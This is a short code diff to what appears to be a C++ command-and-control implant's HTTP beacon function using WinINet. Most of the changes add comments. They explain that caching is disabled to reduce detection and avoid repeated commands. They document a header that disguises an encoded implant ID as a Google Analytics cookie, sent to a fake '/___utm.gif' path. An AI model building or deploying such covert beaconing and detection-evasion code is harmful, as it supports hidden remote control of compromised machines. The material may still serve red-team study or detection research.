@@ -37,7 +37,7 @@ bool HttpGetReq(std::vector<std::wstring>& headers, std::vector<char>& response)
         L"GET",                 // Method - template, mallc2 this
         L"/___utm.gif",         // Path - template, mallc2 this
         NULL, NULL, NULL,
-        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
+        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, ///reload: always gets new, no cache, doesn't cache. cache = bad cuz the data is somewhere else besides beacon. Increases detection likelyhood + potential repeat commands
         0
     );
     if (!hRequest) {
@@ -48,10 +48,13 @@ bool HttpGetReq(std::vector<std::wstring>& headers, std::vector<char>& response)
 
     // 4. Add Headers Loop
     for (const auto& header : headers) {
-        HttpAddRequestHeaders(hRequest, header.c_str(), -1L, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
+        //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpaddrequestheadersa
+        //easier to put headers here rather than 2nd arg of HttpSendRequest
+        HttpAddRequestHeaders(hRequest, header.c_str(), -1L, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE); //HTTP_ADDREQ_FLAG_REPLACE will replace an existing header of the same name
     }
 
     // 5. Send Request
+    //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequesta
     if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
         std::cerr << "Send failed: " << GetLastError() << std::endl;
         InternetCloseHandle(hRequest);
@@ -79,6 +82,7 @@ int main() {
 
     // Define headers (No \r\n needed)
     std::vector<std::wstring> headers = {
+        //msgpack -> b64: {"implant_uuid":"00000-00...."}
         L"utmcc: gaxpbXBsYW50X3V1aWTZIzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAw"
     };
 
